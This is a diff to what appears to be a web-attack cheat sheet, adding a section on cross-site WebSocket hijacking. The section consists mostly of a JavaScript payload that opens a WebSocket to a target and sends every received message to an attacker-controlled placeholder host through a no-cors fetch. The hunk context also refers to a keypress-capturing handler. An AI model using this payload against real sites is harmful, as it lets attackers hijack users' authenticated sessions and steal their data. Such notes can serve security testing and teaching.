@@ -131,4 +131,25 @@ document.onkeypress = function (e) {
 
 use `Flask-Cors` to serve resource. See [apiServ.py](utils/apiServ.py)
 
+## Cross-Site WebSocket Hijacking
+
+Requirement: Websocket HTTP request has no CSRF protection.
+
+`wss://  with  https://` and `ws://  with  http://`
+
+```javascript
+websocket = new WebSocket('wss://<target>')
+websocket.onopen = start
+websocket.onmessage = handleReply
+function start(event) {
+    // initialize the socket
+    websocket.send("xxx");
+}
+function handleReply(event) {
+    // hijack socket message here
+    // no-cors mimic the <img>'s request
+    fetch('https://<myip/?'+event.data, {mode: 'no-cors'})
+}
+```
+
 
